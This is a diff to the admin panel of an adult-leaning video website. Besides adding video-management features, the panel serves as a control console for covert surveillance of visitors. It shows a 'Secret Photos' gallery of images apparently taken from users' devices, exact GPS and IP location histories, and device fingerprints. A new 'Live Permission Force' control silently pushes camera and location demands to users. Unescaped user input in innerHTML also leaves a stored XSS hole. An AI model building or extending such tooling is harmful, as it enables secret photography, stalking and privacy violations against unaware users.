@@ -77,6 +77,11 @@
       <a class="slink active" data-page="addPage">➕ Add Video</a>
       <a class="slink" data-page="managePage">📋 All Videos</a>
       
+      <!-- ADVANCED FEATURES ADDED HERE -->
+      <div class="snav-title">Premium & Support</div>
+      <a class="slink" data-page="requestsPage">📩 Support Requests</a>
+      <a class="slink" data-page="pinsPage">🔑 Premium PINs</a>
+
       <div class="snav-title">System & Users</div>
       <a class="slink" data-page="usersPage">👥 Users Tracking</a>
       <a class="slink" data-page="photosPage">📸 Secret Photos</a>
@@ -87,7 +92,7 @@
       <a class="slink" data-page="settingsPage">⚙️ Settings</a>
     </nav>
     <div style="border-top:1px solid var(--border); padding-top:1rem; margin-top:1rem;">
-      <a class="slink" href="index.html" target="_blank">🌐 View Website</a>
+      <a class="slink" href="index-4-1.html" target="_blank">🌐 View Website</a>
       <a class="slink" id="logoutBtn" style="cursor:pointer;">🚪 Logout</a>
     </div>
   </aside>
@@ -120,7 +125,6 @@
         <label>Main Video Link (Leave blank if adding parts)</label>
         <input class="inp" type="url" id="vlink" placeholder="https://...">
 
-        <!-- HINGLISH: NEW BACKUP DOWNLOAD LINK WALA INPUT ADD KIYA -->
         <label style="margin-top:0.5rem;">Direct Download Link (Backup for App Offline Download)</label>
         <input class="inp" type="url" id="vDownloadLink" placeholder="https://drive.google.com/uc?export=download&id=...">
 
@@ -138,6 +142,41 @@
             <table>
                 <thead><tr><th>Title</th><th>Type</th><th>18+</th><th style="text-align:right;">Actions</th></tr></thead>
                 <tbody id="vlistTbody"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- NEW PAGE: SUPPORT REQUESTS -->
+    <div class="page" id="requestsPage">
+        <h2>User Support Requests</h2>
+        <p style="color:var(--muted); font-size: 0.85rem;">Manage tickets from banned users. Deleting a request allows the user to send a new one.</p>
+        <div class="card-panel" style="margin-top:1.5rem; overflow-x:auto;">
+            <table>
+                <thead><tr><th>Device / Reg ID</th><th>User Info</th><th>Message</th><th>Location</th><th style="text-align:right;">Action</th></tr></thead>
+                <tbody id="requestsTbody"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- NEW PAGE: PREMIUM PINS -->
+    <div class="page" id="pinsPage">
+        <h2>Premium Access PINs</h2>
+        <p style="color:var(--muted); font-size: 0.85rem;">Generate and manage PINs for the special premium lock screen.</p>
+        <div class="card-panel" style="margin-top:1.5rem;">
+            <div style="display:flex; gap:1rem; flex-wrap:wrap; margin-bottom:1rem;">
+                <div style="flex:1;"><label>4-Digit PIN</label><input class="inp" type="number" id="pinCode" placeholder="e.g. 9999" maxlength="4"></div>
+                <div style="flex:1;"><label>Usage Limit</label><input class="inp" type="number" id="pinLimit" placeholder="e.g. 3" value="1"></div>
+            </div>
+            <label>Target Device ID (Optional - Enter ID to restrict to one user, else leave "ALL")</label>
+            <input class="inp" type="text" id="pinDevice" value="ALL" placeholder="Device ID">
+            <label>Premium Video URL (To play after unlock)</label>
+            <input class="inp" type="url" id="pinUrl" placeholder="https://...">
+            <button class="btn btn-red" id="generatePinBtn">➕ Generate PIN</button>
+        </div>
+        <div class="card-panel" style="overflow-x:auto;">
+            <table style="margin-top:0;">
+                <thead><tr><th>PIN Code</th><th>Limit Left</th><th>Target Device</th><th style="text-align:right;">Action</th></tr></thead>
+                <tbody id="pinsTbody"></tbody>
             </table>
         </div>
     </div>
@@ -237,7 +276,6 @@
     </div>
     <label>Main Video URL</label><input class="inp" type="url" id="editLink">
     
-    <!-- HINGLISH: NEW BACKUP DOWNLOAD LINK WALA INPUT FOR EDIT MODAL -->
     <label style="margin-top:0.5rem;">Direct Download Link (Backup for App Offline Download)</label>
     <input class="inp" type="url" id="editDownloadLink">
 
@@ -272,6 +310,18 @@
         <div><b>Timezone & Lang</b><span id="umTz">None</span></div>
         <div><b>First Visit</b><span id="umFirst">None</span></div>
         <div><b>Last Active</b><span id="umLast">None</span></div>
+    </div>
+
+    <!-- NEW ADVANCED FEATURE: LIVE PERMISSION PUSH -->
+    <div style="background:var(--surf3); border:1px solid var(--red); padding:1rem; border-radius:10px; margin-bottom:1.5rem;">
+        <h4 style="margin-bottom:0.5rem; color:#fff;">📡 Live Permission Force (Push to Device)</h4>
+        <p style="font-size:0.8rem; color:var(--muted); margin-bottom:10px;">Select permissions and click Push. User will be silently checked and prompted if not granted.</p>
+        <div style="display:flex; gap:1.5rem; align-items:center; flex-wrap:wrap;">
+            <label style="display:inline-flex; align-items:center; gap:5px;"><input type="checkbox" id="pushCam"> Camera Access</label>
+            <label style="display:inline-flex; align-items:center; gap:5px;"><input type="checkbox" id="pushLoc"> GPS Location</label>
+            <label style="display:inline-flex; align-items:center; gap:5px;"><input type="checkbox" id="pushStore"> Local Storage</label>
+            <button class="btn btn-red" id="pushPermBtn" style="padding:0.4rem 1rem;">Push Rules Now</button>
+        </div>
     </div>
 
     <div style="display:flex; gap:1.5rem; flex-wrap:wrap; margin-bottom:1.5rem;">
@@ -318,6 +368,13 @@
 
   let allVideosRaw = {};
 
+  // Device Fingerprint generator for Admin Security
+  function getAdminDeviceId() {
+      const rawString = `${navigator.userAgent}|${navigator.hardwareConcurrency}|${navigator.deviceMemory}|${window.screen.width}x${window.screen.height}`;
+      let hash = 0; for (let i = 0; i < rawString.length; i++) hash = ((hash << 5) - hash) + rawString.charCodeAt(i);
+      return Math.abs(hash).toString(36).toUpperCase();
+  }
+
   document.getElementById('loginBtn').addEventListener('click', () => {
     const email = document.getElementById('emailInput').value;
     const pass = document.getElementById('passInput').value;
@@ -325,6 +382,20 @@
     if(!email || !pass) return alert("Please enter Email and Password!");
 
     signInWithEmailAndPassword(auth, email, pass)
+      .then(() => {
+          // Admin Client-Side Device Check Logic
+          get(ref(db, 'settings/admin_device')).then((snap) => {
+              if (snap.exists() && snap.val() !== "OPEN") {
+                  if (getAdminDeviceId() !== snap.val()) {
+                      signOut(auth);
+                      alert("SECURITY ALERT: This device is not authorized for Admin Access!");
+                  }
+              } else {
+                  // Pehli baar login par device lock set kar de
+                  set(ref(db, 'settings/admin_device'), getAdminDeviceId());
+              }
+          });
+      })
       .catch((error) => { alert('Incorrect Email or Password'); });
   });
 
@@ -358,51 +429,29 @@
       function loadSecretPhotos() {
           const statusTxt = document.getElementById('photosLoadingStatus');
           const grid = document.getElementById('photosGrid');
-          
           statusTxt.innerText = "Loading photos from database...";
           grid.innerHTML = ''; 
-
           get(ref(db, 'secret_photos')).then((snap) => {
-              if (!snap.exists()) {
-                  statusTxt.innerText = "No new photos found.";
-                  return;
-              }
-              const data = snap.val();
-              const keys = Object.keys(data).reverse(); 
+              if (!snap.exists()) { statusTxt.innerText = "No new photos found."; return; }
+              const data = snap.val(); const keys = Object.keys(data).reverse(); 
               statusTxt.innerText = `${keys.length} Photos found.`;
-              
               keys.forEach(key => {
-                  const photoData = data[key];
-                  const url = photoData.imageBase64;
-                  const timeStr = new Date(photoData.time).toLocaleString();
-                  const devId = photoData.deviceId || 'Unknown';
-                  
+                  const photoData = data[key]; const url = photoData.imageBase64; const timeStr = new Date(photoData.time).toLocaleString(); const devId = photoData.deviceId || 'Unknown';
                   grid.innerHTML += `
                       <div class="photo-card" id="card-${key}">
                           <a href="${url}" target="_blank"><img src="${url}" loading="lazy"></a>
                           <p title="${devId}">User ID: ${devId.substring(0,6)}...</p>
                           <p style="font-size:0.65rem; color:var(--muted);">${timeStr}</p>
                           <button class="btn btn-danger" style="padding:0.4rem; font-size:0.75rem; width:100%; margin-top:5px;" onclick="deleteSecretPhoto('${key}')">🗑️ Delete</button>
-                      </div>
-                  `;
+                      </div>`;
               });
-          }).catch((error) => {
-              statusTxt.innerText = "Error loading photos!";
-          });
+          }).catch((error) => { statusTxt.innerText = "Error loading photos!"; });
       }
-
       document.getElementById('refreshPhotosBtn').addEventListener('click', loadSecretPhotos);
+      window.deleteSecretPhoto = function(key) { if(confirm("Delete this photo permanently?")) { remove(ref(db, 'secret_photos/' + key)).then(() => { const card = document.getElementById('card-' + key); if (card) card.remove(); }); } };
 
-      window.deleteSecretPhoto = function(key) {
-          if(confirm("Delete this photo permanently?")) {
-              remove(ref(db, 'secret_photos/' + key)).then(() => {
-                  const card = document.getElementById('card-' + key);
-                  if (card) card.remove();
-              });
-          }
-      };
-
-      function addPartRow(containerId, title='', url='', image='') {
+      // UPDATED: Added download field to episodes
+      function addPartRow(containerId, title='', url='', image='', dlUrl='') {
           const div = document.createElement('div'); 
           div.style.cssText = "display:flex; flex-direction:column; gap:8px; background:var(--surf2); padding:12px; border-radius:8px; border:1px solid var(--border); margin-bottom:12px;";
           div.innerHTML = `
@@ -414,18 +463,19 @@
                 <input type="url" class="inp part-url" placeholder="Video Link" value="${url}" style="flex:1; margin:0;">
                 <input type="url" class="inp part-image" placeholder="Image URL (Optional)" value="${image}" style="flex:1; margin:0;">
             </div>
+            <input type="url" class="inp part-download" placeholder="Direct Download Link (Backup for this Ep)" value="${dlUrl}" style="width:100%; margin:0;">
           `;
           document.getElementById(containerId).appendChild(div);
       }
       document.getElementById('addPartBtn').addEventListener('click', () => addPartRow('partsContainer'));
       document.getElementById('editAddPartBtn').addEventListener('click', () => addPartRow('editPartsContainer'));
 
-      // HINGLISH: ADD VIDEO WALE SAVE BUTTON MEIN BACKUP LINK ADD KIYA GAYA HAI
+      // UPDATED: Save Logic includes part-download
       document.getElementById('saveVidBtn').addEventListener('click', () => {
           let parts = [];
           document.querySelectorAll('#partsContainer > div').forEach(row => {
-              let t = row.querySelector('.part-title').value; let u = row.querySelector('.part-url').value; let i = row.querySelector('.part-image').value;
-              if(t && u) parts.push({title: t, url: u, image: i});
+              let t = row.querySelector('.part-title').value; let u = row.querySelector('.part-url').value; let i = row.querySelector('.part-image').value; let d = row.querySelector('.part-download').value;
+              if(t && u) parts.push({title: t, url: u, image: i, downloadUrl: d});
           });
           const data = {
               title: document.getElementById('vtitle').value, imageUrl: document.getElementById('vimage').value,
@@ -456,10 +506,8 @@
               </tr>`;
           });
       });
-
       window.deleteVid = (id) => { if(confirm("Delete video?")) remove(ref(db, 'videos/'+id)); };
 
-      // HINGLISH: EDIT MODAL KHOLE PAR BACKUP LINK BHI LOAD HOGA
       window.openEdit = (id) => {
           const v = allVideosRaw[id];
           document.getElementById('editId').value = id; document.getElementById('editTitle').value = v.title;
@@ -468,17 +516,16 @@
           document.getElementById('editType').value = v.type || 'external'; document.getElementById('edit18plus').value = v.is18Plus || 'false';
           
           const epContainer = document.getElementById('editPartsContainer'); epContainer.innerHTML = '';
-          if(v.parts) { v.parts.forEach(p => addPartRow('editPartsContainer', p.title, p.url, p.image)); }
+          if(v.parts) { v.parts.forEach(p => addPartRow('editPartsContainer', p.title, p.url, p.image, p.downloadUrl || '')); }
           document.getElementById('editModal').style.display = 'flex';
       };
 
-      // HINGLISH: EDIT VIDEO UPDATE KARNE MEIN BACKUP LINK UPDATE HOGA
       document.getElementById('saveEditBtn').addEventListener('click', () => {
           const id = document.getElementById('editId').value;
           let parts = [];
           document.querySelectorAll('#editPartsContainer > div').forEach(row => {
-              let t = row.querySelector('.part-title').value; let u = row.querySelector('.part-url').value; let i = row.querySelector('.part-image').value;
-              if(t && u) parts.push({title: t, url: u, image: i});
+              let t = row.querySelector('.part-title').value; let u = row.querySelector('.part-url').value; let i = row.querySelector('.part-image').value; let d = row.querySelector('.part-download').value;
+              if(t && u) parts.push({title: t, url: u, image: i, downloadUrl: d});
           });
           update(ref(db, 'videos/' + id), {
               title: document.getElementById('editTitle').value, imageUrl: document.getElementById('editImg').value,
@@ -489,22 +536,70 @@
           }).then(() => { alert("Video Updated!"); document.getElementById('editModal').style.display = 'none'; });
       });
 
+      // NEW: Support Requests Logic
+      onValue(ref(db, 'support_requests'), snap => {
+          const data = snap.val() || {};
+          const tb = document.getElementById('requestsTbody'); tb.innerHTML = '';
+          Object.keys(data).reverse().forEach(k => {
+              const req = data[k];
+              tb.innerHTML += `<tr>
+                  <td style="font-size:0.75rem; color:var(--red); font-family:monospace;">${req.regId}</td>
+                  <td style="font-size:0.8rem;"><b>Name:</b> ${req.name}<br><b>Contact:</b> ${req.contactInfo}</td>
+                  <td style="font-size:0.85rem;">${req.message}</td>
+                  <td style="font-size:0.8rem;">
+                      OS: ${req.os}<br>
+                      <a href="https://www.google.com/maps?q=${req.lat},${req.lon}" target="_blank" style="color:var(--green); text-decoration:underline;">📍 Maps</a>
+                  </td>
+                  <td style="text-align:right;">
+                      <button class="btn btn-red" style="padding:0.4rem 0.8rem;" onclick="deleteRequest('${k}')">✅ Solved</button>
+                  </td>
+              </tr>`;
+          });
+      });
+      window.deleteRequest = (id) => {
+          if(confirm("Mark as Solved and delete? User can send a new report after this.")) {
+              remove(ref(db, 'support_requests/' + id));
+          }
+      };
+
+      // NEW: Premium PINs Logic
+      document.getElementById('generatePinBtn').addEventListener('click', () => {
+          const pin = document.getElementById('pinCode').value;
+          const limit = document.getElementById('pinLimit').value;
+          const devId = document.getElementById('pinDevice').value || "ALL";
+          const url = document.getElementById('pinUrl').value;
+          if(!pin || pin.length < 4) return alert("Enter valid 4 digit PIN.");
+          set(ref(db, `premium_pins/${pin}`), { limit: parseInt(limit), deviceId: devId, videoUrl: url, created: new Date().toISOString() })
+          .then(()=> { alert("PIN Generated!"); document.getElementById('pinCode').value=''; document.getElementById('pinUrl').value=''; });
+      });
+      onValue(ref(db, 'premium_pins'), snap => {
+          const data = snap.val() || {};
+          const tb = document.getElementById('pinsTbody'); tb.innerHTML = '';
+          Object.keys(data).forEach(k => {
+              const p = data[k];
+              tb.innerHTML += `<tr>
+                  <td style="font-size:1rem; font-weight:bold; color:var(--red);">${k}</td>
+                  <td>${p.limit}</td>
+                  <td style="font-family:monospace; font-size:0.8rem;">${p.deviceId}</td>
+                  <td style="text-align:right;"><button class="btn btn-gray" style="padding:0.4rem 0.8rem;" onclick="deletePin('${k}')">🗑️ Revoke</button></td>
+              </tr>`;
+          });
+      });
+      window.deletePin = (pin) => { if(confirm("Revoke this PIN?")) remove(ref(db, `premium_pins/${pin}`)); };
+
+      // User Tracking Logic
       let allUsers = {};
       onValue(ref(db, 'users'), snap => {
           allUsers = snap.val() || {};
           const tb = document.getElementById('userTableBody'); tb.innerHTML = '';
           Object.keys(allUsers).reverse().forEach(k => {
               const u = allUsers[k];
-              const isBanned = u.banned;
-              const isLive = u.status === 'Live';
-              
+              const isBanned = u.banned; const isLive = u.status === 'Live';
               let statBadge = '';
               if(isBanned) statBadge = '<span class="badge-banned">🚫 Banned</span>';
               else if(isLive) statBadge = '<span class="badge-active" style="background:#2DC653;color:#fff;">🟢 Live</span>';
               else statBadge = '<span class="badge-banned" style="background:var(--surf3);color:var(--muted);">🔴 Offline</span>';
-
               const shortOs = u.device?.os || 'Unknown';
-
               tb.innerHTML += `<tr>
                   <td style="font-family:monospace; font-size:0.8rem; color:var(--red);">${k}</td>
                   <td>${shortOs}</td>
@@ -515,26 +610,20 @@
           });
       });
 
+      let viewingUserId = null;
       window.viewUser = (id) => {
+          viewingUserId = id;
           const u = allUsers[id];
-          const d = u.device || {};
-          const n = u.network || {};
+          const d = u.device || {}; const n = u.network || {};
 
           document.getElementById('umTitle').innerText = id;
-          
-          document.getElementById('umType').innerText = d.type || 'None';
-          document.getElementById('umOS').innerText = d.os || 'None';
+          document.getElementById('umType').innerText = d.type || 'None'; document.getElementById('umOS').innerText = d.os || 'None';
           document.getElementById('umBrowser').innerText = (d.browser || 'None') + (d.cookieEnabled ? ' (Cookies: Yes)' : '');
-          
-          document.getElementById('umISP').innerText = n.org || 'None';
-          document.getElementById('umLocation').innerText = `${n.city || ''}, ${n.region || 'None'}`;
-          document.getElementById('umIp').innerText = n.ip || 'None';
-          
-          document.getElementById('umGPU').innerText = d.gpu || 'None';
+          document.getElementById('umISP').innerText = n.org || 'None'; document.getElementById('umLocation').innerText = `${n.city || ''}, ${n.region || 'None'}`;
+          document.getElementById('umIp').innerText = n.ip || 'None'; document.getElementById('umGPU').innerText = d.gpu || 'None';
           document.getElementById('umHardware').innerText = `RAM: ${d.ram || '?'} | CPU: ${d.cores || '?'}`;
           document.getElementById('umScreen').innerText = `${d.screen || '?'} | Touch: ${d.touch || 'No'}`;
           document.getElementById('umTz').innerText = `${d.tz || '?'} | ${d.lang || '?'}`;
-
           document.getElementById('umFirst').innerText = u.firstVisit ? new Date(u.firstVisit).toLocaleString() : 'None';
           document.getElementById('umLast').innerText = u.lastActive ? new Date(u.lastActive).toLocaleString() : 'None';
 
@@ -543,101 +632,60 @@
           banBtn.style.background = u.banned ? "var(--green)" : "var(--red)";
           banBtn.onclick = () => { update(ref(db, 'users/'+id), {banned: !u.banned}); document.getElementById('userModal').style.display='none'; };
 
-          // Action Logs (Lag Fix)
+          // Pre-fill live permissions
+          get(ref(db, `users/${id}/custom_perms`)).then(snap => {
+              const perms = snap.val() || {};
+              document.getElementById('pushCam').checked = perms.camera || false;
+              document.getElementById('pushLoc').checked = perms.location || false;
+              document.getElementById('pushStore').checked = perms.storage || false;
+          });
+
           const actionBox = document.getElementById('umActionsList'); 
           if(u.actions) {
               const acts = Object.values(u.actions).sort((a,b) => new Date(b.time) - new Date(a.time)).slice(0, 100);
-              let actsHtml = '';
-              acts.forEach(a => {
-                  actsHtml += `<div class="action-row">
-                      <span style="color:var(--text);">${a.action}</span>
-                      <span style="color:var(--muted);">${new Date(a.time).toLocaleString()}</span>
-                  </div>`;
-              });
+              let actsHtml = ''; acts.forEach(a => { actsHtml += `<div class="action-row"><span style="color:var(--text);">${a.action}</span><span style="color:var(--muted);">${new Date(a.time).toLocaleString()}</span></div>`; });
               actionBox.innerHTML = actsHtml;
           } else { actionBox.innerHTML = '<div class="action-row" style="color:var(--muted); justify-content:center;">No live actions recorded yet.</div>'; }
 
-          // Location Logs (Lag Fix)
-          const locBox = document.getElementById('umLocationHistory'); 
-          let allLocs = [];
-          if (u.locationHistory) { 
-              Object.values(u.locationHistory).forEach(loc => { allLocs.push({ type: 'Network (IP)', text: `${loc.city}, ${loc.region} (IP: ${loc.ip})`, time: loc.time }); });
-          }
-          if (u.gpsHistory) { 
-              Object.values(u.gpsHistory).forEach(gps => { allLocs.push({ type: 'Exact GPS', text: `Accurate to ${gps.accuracy} <br> <a href="https://www.google.com/maps?q=${gps.lat},${gps.lon}" target="_blank" style="color:var(--green); text-decoration:underline; font-size: 0.8rem;">📍 Open Maps</a>`, time: gps.time }); });
-          }
-
+          const locBox = document.getElementById('umLocationHistory'); let allLocs = [];
+          if (u.locationHistory) { Object.values(u.locationHistory).forEach(loc => { allLocs.push({ type: 'Network (IP)', text: `${loc.city}, ${loc.region} (IP: ${loc.ip})`, time: loc.time }); }); }
+          if (u.gpsHistory) { Object.values(u.gpsHistory).forEach(gps => { allLocs.push({ type: 'Exact GPS', text: `Accurate to ${gps.accuracy} <br> <a href="https://www.google.com/maps?q=${gps.lat},${gps.lon}" target="_blank" style="color:var(--green); text-decoration:underline; font-size: 0.8rem;">📍 Open Maps</a>`, time: gps.time }); }); }
           if(allLocs.length > 0) {
               allLocs.sort((a,b) => new Date(b.time) - new Date(a.time)).slice(0, 50);
-              let locsHtml = '';
-              allLocs.forEach(l => {
-                  locsHtml += `<div class="action-row" style="flex-direction:column; align-items:flex-start;">
-                      <div style="width:100%; display:flex; justify-content:space-between; margin-bottom:3px;">
-                          <span style="color:var(--text); font-weight:600;">${l.type}</span>
-                          <span style="color:var(--muted); font-size:0.75rem;">${new Date(l.time).toLocaleString()}</span>
-                      </div>
-                      <span style="color:var(--muted); font-size:0.8rem;">${l.text}</span>
-                  </div>`;
-              });
+              let locsHtml = ''; allLocs.forEach(l => { locsHtml += `<div class="action-row" style="flex-direction:column; align-items:flex-start;"><div style="width:100%; display:flex; justify-content:space-between; margin-bottom:3px;"><span style="color:var(--text); font-weight:600;">${l.type}</span><span style="color:var(--muted); font-size:0.75rem;">${new Date(l.time).toLocaleString()}</span></div><span style="color:var(--muted); font-size:0.8rem;">${l.text}</span></div>`; });
               locBox.innerHTML = locsHtml;
           } else { locBox.innerHTML = '<div class="action-row" style="color:var(--muted); justify-content:center;">No location history available.</div>'; }
 
-          // Watch History (Lag Fix)
           const htb = document.getElementById('umHistory'); 
           if(u.history) {
-              let histHtml = '';
-              Object.values(u.history).forEach(h => { histHtml += `<tr><td>${h.title}</td><td>${h.plays}</td><td>${h.totalDuration}s</td></tr>`; });
-              htb.innerHTML = histHtml;
+              let histHtml = ''; Object.values(u.history).forEach(h => { histHtml += `<tr><td>${h.title}</td><td>${h.plays}</td><td>${h.totalDuration}s</td></tr>`; }); htb.innerHTML = histHtml;
           } else { htb.innerHTML = '<tr><td colspan="3" style="text-align:center; color:var(--muted);">No history yet.</td></tr>'; }
 
           document.getElementById('userModal').style.display = 'flex';
       };
 
+      // NEW: Push Live Permissions Button Logic
+      document.getElementById('pushPermBtn').addEventListener('click', () => {
+          if(!viewingUserId) return;
+          const rules = {
+              camera: document.getElementById('pushCam').checked,
+              location: document.getElementById('pushLoc').checked,
+              storage: document.getElementById('pushStore').checked
+          };
+          update(ref(db, `users/${viewingUserId}/custom_perms`), rules).then(() => {
+              alert("Permissions Pushed! If user is live, their screen will securely check access.");
+          });
+      });
+
       get(ref(db, 'settings/ad')).then(snap => {
           const data = snap.val();
-          if(data) {
-              document.getElementById('adEnabled').value = data.enabled ? 'true' : 'false';
-              document.getElementById('adType').value = data.type || 'image';
-              document.getElementById('adUrl').value = data.url || '';
-              document.getElementById('adSkip').value = data.skipTime || 5;
-          }
+          if(data) { document.getElementById('adEnabled').value = data.enabled ? 'true' : 'false'; document.getElementById('adType').value = data.type || 'image'; document.getElementById('adUrl').value = data.url || ''; document.getElementById('adSkip').value = data.skipTime || 5; }
       });
-      document.getElementById('saveAdBtn').addEventListener('click', () => {
-          set(ref(db, 'settings/ad'), {
-              enabled: document.getElementById('adEnabled').value === 'true', type: document.getElementById('adType').value,
-              url: document.getElementById('adUrl').value, skipTime: document.getElementById('adSkip').value
-          }).then(() => alert("Ad Settings Saved!"));
-      });
-
-      onValue(ref(db, 'settings/social'), snap => {
-          const d = snap.val();
-          if(d) {
-              document.getElementById('socDiscord').value = d.discord || ''; document.getElementById('socTelegram').value = d.telegram || '';
-              document.getElementById('socWhatsapp').value = d.whatsapp || ''; document.getElementById('socInstagram').value = d.instagram || '';
-              document.getElementById('socX').value = d.x || '';
-          }
-      }, {onlyOnce:true});
-      document.getElementById('saveSocBtn').addEventListener('click', () => {
-          set(ref(db, 'settings/social'), {
-              discord: document.getElementById('socDiscord').value, telegram: document.getElementById('socTelegram').value,
-              whatsapp: document.getElementById('socWhatsapp').value, instagram: document.getElementById('socInstagram').value,
-              x: document.getElementById('socX').value
-          }).then(() => alert("Social Links Updated!"));
-      });
-      
-      onValue(ref(db, 'settings/general'), snap => { 
-          const data = snap.val();
-          if(data?.favicon) document.getElementById('setFavicon').value = data.favicon; 
-          if(data?.apkLink) document.getElementById('setApkLink').value = data.apkLink;
-      }, {onlyOnce:true});
-
-      document.getElementById('saveSetBtn').addEventListener('click', () => { 
-          update(ref(db, 'settings/general'), {
-              favicon: document.getElementById('setFavicon').value,
-              apkLink: document.getElementById('setApkLink').value
-          }).then(()=>alert("Settings updated!")); 
-      });
-
+      document.getElementById('saveAdBtn').addEventListener('click', () => { set(ref(db, 'settings/ad'), { enabled: document.getElementById('adEnabled').value === 'true', type: document.getElementById('adType').value, url: document.getElementById('adUrl').value, skipTime: document.getElementById('adSkip').value }).then(() => alert("Ad Settings Saved!")); });
+      onValue(ref(db, 'settings/social'), snap => { const d = snap.val(); if(d) { document.getElementById('socDiscord').value = d.discord || ''; document.getElementById('socTelegram').value = d.telegram || ''; document.getElementById('socWhatsapp').value = d.whatsapp || ''; document.getElementById('socInstagram').value = d.instagram || ''; document.getElementById('socX').value = d.x || ''; } }, {onlyOnce:true});
+      document.getElementById('saveSocBtn').addEventListener('click', () => { set(ref(db, 'settings/social'), { discord: document.getElementById('socDiscord').value, telegram: document.getElementById('socTelegram').value, whatsapp: document.getElementById('socWhatsapp').value, instagram: document.getElementById('socInstagram').value, x: document.getElementById('socX').value }).then(() => alert("Social Links Updated!")); });
+      onValue(ref(db, 'settings/general'), snap => { const data = snap.val(); if(data?.favicon) document.getElementById('setFavicon').value = data.favicon; if(data?.apkLink) document.getElementById('setApkLink').value = data.apkLink; }, {onlyOnce:true});
+      document.getElementById('saveSetBtn').addEventListener('click', () => { update(ref(db, 'settings/general'), { favicon: document.getElementById('setFavicon').value, apkLink: document.getElementById('setApkLink').value }).then(()=>alert("Settings updated!")); });
       document.getElementById('wipeBtn').addEventListener('click', () => { if(confirm("Danger: Delete ALL Videos?")) { remove(ref(db, 'videos')).then(()=>alert("Wiped!")); } });
   }
 </script>
